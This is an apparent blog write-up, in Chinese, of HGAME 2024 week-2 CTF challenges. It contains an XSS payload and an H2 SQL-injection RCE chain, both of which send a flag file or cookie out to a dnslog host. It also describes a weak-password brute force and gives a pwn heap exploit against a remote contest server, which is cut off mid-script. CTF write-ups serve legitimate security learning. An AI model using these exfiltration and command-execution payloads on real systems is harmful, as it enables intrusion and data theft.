http%3A%2F%2F127.0.0.1%3A8080%3Ftmpl%3D%7B%7B.Query%20%60user%60%7D%7D%26user%3D%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A8080%2Fflag%22)%253BsetTimeout(function()%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%253Bxhr.open(&#x27;GET&#x27;%2C%20&#x27;http%3A%2F%2F127.0.0.1%3A8080%2F%253Ftmpl%253D%257B%257B.Cookie%2520%2560flag%2560%257D%257D&#x27;)%253Bxhr.withCredentials%20%3D%20true%253Bxhr.send()%253Bxhr.onreadystatechange%3Dfunction()%7Bvar%20a%3D%22y%22%252b(xhr.responseText).substring(6%2C46)%253Bwindow.open(%22http%3A%2F%2F%22%252ba%252b%22.kbqsag.ceye.io%22)%253B%7D%253B%7D%2C1000)%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_3_3.png"></p><p>最后包上大括号和flag头即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;4ce7fdcfe812901f4460c4d9b9c0e90d77e6d6e6&#125;</span><br></pre></td></tr></table></figure><h2 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a>search4member</h2><p>堆叠注入+HikariCP数据库rce</p><p>参考链接：<a href="https://www.cnblogs.com/shineman-zhang/articles/16753095.html">Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞 </a></p><p>和参考链接的原理是一样的</p><p>查看代码的sql语句</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot;</span> + keyword + <span class="string">&quot;%&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里是用了拼接的形式，输入也没有过滤，因此存在sql注入，可以通过<code>%25&#39;;--+&#39;</code>闭合。</p><p>闭合后，可以堆叠注入，因此可以用来执行参考链接里 RCE所需的SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;</span>; <span class="keyword">CALL</span> <span class="keyword">EXEC</span>(<span class="string">&#x27;curl kbqsag.ceye.io&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在 dnslog 得到回显。</p><p>这里需要注意的是</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;</span>; </span><br></pre></td></tr></table></figure><p>这里是用CREATE ALIAS创建一个java函数，只需要创建一次，后续无需创建。</p><p>也就是只有第一次的时候要发，后面只需要执行<code>CALL EXEC(&#39;xxx&#39;);</code>，重复发会出错。</p><p>这里还是用了<code>Runtime.getRuntime().exec</code>来执行命令，因此用上反弹shell的payload，修改一下即可用dnslog带出flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keyword=web%25&#x27;;CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;; CALL EXEC(&#x27;bash -c &#123;echo,Y3VybCBgY2F0IC9mbGFnYC5rYnFzYWcuY2V5ZS5pbw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;);--+</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/w_4_1.png"></p><p>补上花括号即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;99b9cb6e567edccda0a8a4347781af41bb3701f3&#125;</span><br></pre></td></tr></table></figure><h2 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a>Select More Courses</h2><p>先弱口令爆破密码，得到密码为 <code>qwert123</code></p><p><img src="/./hgame2024_week2/w_5_1.png"></p><p>和week1的<code>Select Courses</code>一样的方法，在<code>/api/expand</code>重复发包。</p><p><img src="/./hgame2024_week2/w_5_2.png"></p><p>之后去 <code>自主选课</code>页面选课，选课成功后点<code>选完了</code>即可得到flag。</p><p><img src="/./hgame2024_week2/w_5_3.png"></p><p><img src="/./hgame2024_week2/w_5_4.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">a=[getPrime(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">p=random.getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:])==<span class="number">32</span></span><br><span class="line">bag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    temp=p%<span class="number">2</span></span><br><span class="line">    bag+=temp*i</span><br><span class="line">    p=p&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">enc=bytes_to_long(flag)^p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;bag=<span class="subst">&#123;bag&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">enc=871114172567853490297478570113449366988793760172844644007566824913350088148162949968812541218339</span></span><br><span class="line"><span class="string">a=[3245882327, 3130355629, 2432460301, 3249504299, 3762436129, 3056281051, 3484499099, 2830291609, 3349739489, 2847095593, 3532332619, 2406839203, 4056647633, 3204059951, 3795219419, 3240880339, 2668368499, 4227862747, 2939444527, 3375243559]</span></span><br><span class="line"><span class="string">bag=45893025064</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>非预期，<code>enc</code>来个<code>long_to_bytes</code>即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="number">871114172567853490297478570113449366988793760172844644007566824913350088148162949968812541218339</span></span><br><span class="line">flag = long_to_bytes(enc)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="backpack-revenge"><a href="#backpack-revenge" class="headerlink" title="backpack revenge"></a>backpack revenge</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a=[getPrime(<span class="number">96</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">p=random.getrandbits(<span class="number">48</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:])==<span class="number">48</span></span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span>+hashlib.sha256(<span class="built_in">str</span>(p).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">bag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    temp=p%<span class="number">2</span></span><br><span class="line">    bag+=temp*i</span><br><span class="line">    p=p&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;bag=<span class="subst">&#123;bag&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a=[74763079510261699126345525979, 51725049470068950810478487507, 47190309269514609005045330671, 64955989640650139818348214927, 68559937238623623619114065917, 72311339170112185401496867001, 70817336064254781640273354039, 70538108826539785774361605309, 43782530942481865621293381023, 58234328186578036291057066237, 68808271265478858570126916949, 61660200470938153836045483887, 63270726981851544620359231307, 42904776486697691669639929229, 41545637201787531637427603339, 74012839055649891397172870891, 56943794795641260674953676827, 51737391902187759188078687453, 49264368999561659986182883907, 60044221237387104054597861973, 63847046350260520761043687817, 62128146699582180779013983561, 65109313423212852647930299981, 66825635869831731092684039351, 67763265147791272083780752327, 61167844083999179669702601647, 55116015927868756859007961943, 52344488518055672082280377551, 52375877891942312320031803919, 69659035941564119291640404791, 52563282085178646767814382889, 56810627312286420494109192029, 49755877799006889063882566549, 43858901672451756754474845193, 67923743615154983291145624523, 51689455514728547423995162637, 67480131151707155672527583321, 59396212248330580072184648071, 63410528875220489799475249207, 48011409288550880229280578149, 62561969260391132956818285937, 44826158664283779410330615971, 70446218759976239947751162051, 56509847379836600033501942537, 50154287971179831355068443153, 49060507116095861174971467149, 54236848294299624632160521071, 64186626428974976108467196869]</span></span><br><span class="line"><span class="string">bag=1202548196826013899006527314947</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>背包密码，用sage来求出p。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">c=<span class="number">1202548196826013899006527314947</span></span><br><span class="line"></span><br><span class="line">pubkey=[<span class="number">74763079510261699126345525979</span>, <span class="number">51725049470068950810478487507</span>, <span class="number">47190309269514609005045330671</span>, <span class="number">64955989640650139818348214927</span>, <span class="number">68559937238623623619114065917</span>, <span class="number">72311339170112185401496867001</span>, <span class="number">70817336064254781640273354039</span>, <span class="number">70538108826539785774361605309</span>, <span class="number">43782530942481865621293381023</span>, <span class="number">58234328186578036291057066237</span>, <span class="number">68808271265478858570126916949</span>, <span class="number">61660200470938153836045483887</span>, <span class="number">63270726981851544620359231307</span>, <span class="number">42904776486697691669639929229</span>, <span class="number">41545637201787531637427603339</span>, <span class="number">74012839055649891397172870891</span>, <span class="number">56943794795641260674953676827</span>, <span class="number">51737391902187759188078687453</span>, <span class="number">49264368999561659986182883907</span>, <span class="number">60044221237387104054597861973</span>, <span class="number">63847046350260520761043687817</span>, <span class="number">62128146699582180779013983561</span>, <span class="number">65109313423212852647930299981</span>, <span class="number">66825635869831731092684039351</span>, <span class="number">67763265147791272083780752327</span>, <span class="number">61167844083999179669702601647</span>, <span class="number">55116015927868756859007961943</span>, <span class="number">52344488518055672082280377551</span>, <span class="number">52375877891942312320031803919</span>, <span class="number">69659035941564119291640404791</span>, <span class="number">52563282085178646767814382889</span>, <span class="number">56810627312286420494109192029</span>, <span class="number">49755877799006889063882566549</span>, <span class="number">43858901672451756754474845193</span>, <span class="number">67923743615154983291145624523</span>, <span class="number">51689455514728547423995162637</span>, <span class="number">67480131151707155672527583321</span>, <span class="number">59396212248330580072184648071</span>, <span class="number">63410528875220489799475249207</span>, <span class="number">48011409288550880229280578149</span>, <span class="number">62561969260391132956818285937</span>, <span class="number">44826158664283779410330615971</span>, <span class="number">70446218759976239947751162051</span>, <span class="number">56509847379836600033501942537</span>, <span class="number">50154287971179831355068443153</span>, <span class="number">49060507116095861174971467149</span>, <span class="number">54236848294299624632160521071</span>, <span class="number">64186626428974976108467196869</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(pubkey))</span></span><br><span class="line"><span class="comment">#272</span></span><br><span class="line">nbit=<span class="number">48</span></span><br><span class="line"><span class="comment">#随机找一个符合条件的N</span></span><br><span class="line">N=nextprime(gmpy2.iroot(nbit,<span class="number">2</span>)[<span class="number">0</span>]//<span class="number">2</span>)</span><br><span class="line">L=Matrix(QQ,nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="comment">#构造矩阵L</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,i]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,nbit]=pubkey[i]*N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[nbit,i]=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">L[nbit,nbit]=c*N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL start&quot;</span>)</span><br><span class="line">res=L.LLL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>)):</span><br><span class="line">    <span class="comment"># print solution</span></span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]<span class="comment">#最后面密文恢复后变成0</span></span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">1</span>/<span class="number">2</span> <span class="keyword">and</span> m != -<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#根据破解原理，恢复的明文应只包含-1/2和1/2</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        mm=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (i, M)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> M:</span><br><span class="line">            <span class="keyword">if</span> j==-<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#不确定-1/2和1/2哪个代表二进制1</span></span><br><span class="line">                mm+=<span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mm+=<span class="string">&quot;0&quot;</span></span><br><span class="line">flag=mm[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p = <span class="built_in">int</span>(flag,<span class="number">2</span>)</span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span>+hashlib.sha256(<span class="built_in">str</span>(p).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># hgame&#123;04b1d0b0fb805a70cda94348ec5a33f900d4fd5e9c45e765161c434fa0a49991&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="midRSA"><a href="#midRSA" class="headerlink" title="midRSA"></a>midRSA</h2><p>非预期</p><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">flag</span>):</span><br><span class="line">    <span class="keyword">return</span> flag+<span class="string">b&#x27;\xff&#x27;</span>*(<span class="number">64</span>-<span class="built_in">len</span>(flag))</span><br><span class="line"></span><br><span class="line">flag=padding(flag)</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">m0=m&gt;&gt;<span class="number">208</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m0=<span class="subst">&#123;m0&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=120838778421252867808799302603972821425274682456261749029016472234934876266617266346399909705742862458970575637664059189613618956880430078774892479256301209695323302787221508556481196281420676074116272495278097275927604857336484564777404497914572606299810384987412594844071935546690819906920254004045391585427</span></span><br><span class="line"><span class="string">c=118961547254465282603128910126369011072248057317653811110746611348016137361383017921465395766977129601435508590006599755740818071303929227578504412967513468921191689357367045286190040251695094706564443721393216185563727951256414649625597950957960429709583109707961019498084511008637686004730015209939219983527</span></span><br><span class="line"><span class="string">m0=13292147408567087351580732082961640130543313742210409432471625281702327748963274496942276607</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接<code>long_to_bytes</code>解<code>m0</code>即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m0=<span class="number">13292147408567087351580732082961640130543313742210409432471625281702327748963274496942276607</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m0))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;0ther_cas3s_0f_c0ppr3smith&#125;\xff\xff\xff\xff\xff&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="midRSA-revenge"><a href="#midRSA-revenge" class="headerlink" title="midRSA revenge"></a>midRSA revenge</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">5</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">m0=m&gt;&gt;<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m0=<span class="subst">&#123;m0&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=27814334728135671995890378154778822687713875269624843122353458059697288888640572922486287556431241786461159513236128914176680497775619694684903498070577307810263677280294114135929708745988406963307279767028969515305895207028282193547356414827419008393701158467818535109517213088920890236300281646288761697842280633285355376389468360033584102258243058885174812018295460196515483819254913183079496947309574392848378504246991546781252139861876509894476420525317251695953355755164789878602945615879965709871975770823484418665634050103852564819575756950047691205355599004786541600213204423145854859214897431430282333052121</span></span><br><span class="line"><span class="string">c=456221314115867088638207203034494636244706611111621723577848729096069230067958132663018625661447131501758684502639383208332844681939698124459188571813527149772292464139530736717619741704945926075632064072125361516435631121845753186559297993355270779818057702973783391589851159114029310296551701456748698914231344835187917559305440269560613326893204748127999254902102919605370363889581136724164096879573173870280806620454087466970358998654736755257023225078147018537101</span></span><br><span class="line"><span class="string">m0=9999900281003357773420310681169330823266532533803905637</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rsa高位m泄露，参考：<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130138213">m高位攻击</a></p><p>用sage跑出m。</p><p>因为在线的sage网站没有<code>Crypto.Util.number</code>库，自己写一个<code>long_to_bytes</code>函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n=<span class="number">27814334728135671995890378154778822687713875269624843122353458059697288888640572922486287556431241786461159513236128914176680497775619694684903498070577307810263677280294114135929708745988406963307279767028969515305895207028282193547356414827419008393701158467818535109517213088920890236300281646288761697842280633285355376389468360033584102258243058885174812018295460196515483819254913183079496947309574392848378504246991546781252139861876509894476420525317251695953355755164789878602945615879965709871975770823484418665634050103852564819575756950047691205355599004786541600213204423145854859214897431430282333052121</span></span><br><span class="line">c=<span class="number">456221314115867088638207203034494636244706611111621723577848729096069230067958132663018625661447131501758684502639383208332844681939698124459188571813527149772292464139530736717619741704945926075632064072125361516435631121845753186559297993355270779818057702973783391589851159114029310296551701456748698914231344835187917559305440269560613326893204748127999254902102919605370363889581136724164096879573173870280806620454087466970358998654736755257023225078147018537101</span></span><br><span class="line">m0=<span class="number">9999900281003357773420310681169330823266532533803905637</span></span><br><span class="line">m_high = m0&lt;&lt;<span class="number">128</span></span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">kbits = <span class="number">128</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m_high + x)^e - c</span><br><span class="line">x0 = f.small_roots(<span class="number">2</span>^kbits,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">m = m_high + x0</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">hex_value=<span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_value), <span class="number">2</span>):</span><br><span class="line">    hex_byte = hex_value[i:i+<span class="number">2</span>]  <span class="comment"># 每两个字符为一个十六进制字节</span></span><br><span class="line">    decimal_value = <span class="built_in">int</span>(hex_byte, <span class="number">16</span>)  <span class="comment"># 将十六进制字节转换为十进制值</span></span><br><span class="line">    char = <span class="built_in">chr</span>(decimal_value)  <span class="comment"># 将十进制值转换为字符</span></span><br><span class="line">    flag += char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">m = 3402789736593180236658155503802934243882633217001276110520820253391839278880462965966606922621</span></span><br><span class="line"><span class="string">hgame&#123;c0ppr3smith_St3re0typed_m3ssag3s&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,e</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">64</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">n=p**<span class="number">4</span>*q</span><br><span class="line">k=getPrime(<span class="number">16</span>)</span><br><span class="line">gift=<span class="built_in">pow</span>(e+<span class="number">114514</span>+p**k,<span class="number">0x10001</span>,p)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p=<span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q=<span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gift=<span class="subst">&#123;gift&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=14213355454944773291</span></span><br><span class="line"><span class="string">q=61843562051620700386348551175371930486064978441159200765618339743764001033297</span></span><br><span class="line"><span class="string">c=105002138722466946495936638656038214000043475751639025085255113965088749272461906892586616250264922348192496597986452786281151156436229574065193965422841</span></span><br><span class="line"><span class="string">gift=9751789326354522940</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先求e，通过化简，可以知道 <code>gift=pow(e+114514,0x10001,p)</code>，可以求出<code>e</code>。</p><p>接着是求m，可以发现<code>p-1</code>是<code>e</code>的倍数，要用AMM算法来求m。</p><p>参考链接：<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">RSA</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">14213355454944773291</span></span><br><span class="line">q=<span class="number">61843562051620700386348551175371930486064978441159200765618339743764001033297</span></span><br><span class="line">c=<span class="number">105002138722466946495936638656038214000043475751639025085255113965088749272461906892586616250264922348192496597986452786281151156436229574065193965422841</span></span><br><span class="line">gift=<span class="number">9751789326354522940</span></span><br><span class="line">d1 = gmpy2.invert(<span class="number">0x10001</span>, (p - <span class="number">1</span>))</span><br><span class="line">e = <span class="built_in">pow</span>(gift, d1, p)-<span class="number">114514</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mp <span class="keyword">in</span> GF(p)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> mq <span class="keyword">in</span> GF(q)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">        m = crt([ZZ(mp), ZZ(mq)], [p, q])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">            <span class="keyword">if</span> res.isascii():</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Ad1eman_Mand3r_Mi11er_M3th0d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Elden-Ring-Ⅱ"><a href="#Elden-Ring-Ⅱ" class="headerlink" title="Elden Ring Ⅱ"></a>Elden Ring Ⅱ</h2><p>堆的uaf，不怎么会。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_73290593/article/details/128831906">Hgame-2023(前三周pwn题解)</a></p><p>和Hgame-2023 week2的 editablenote差不多，直接用exp就能跑（</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;106.14.57.14&#x27;</span>,<span class="number">30261</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">leng,color</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(leng).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">id1</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">id1</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span 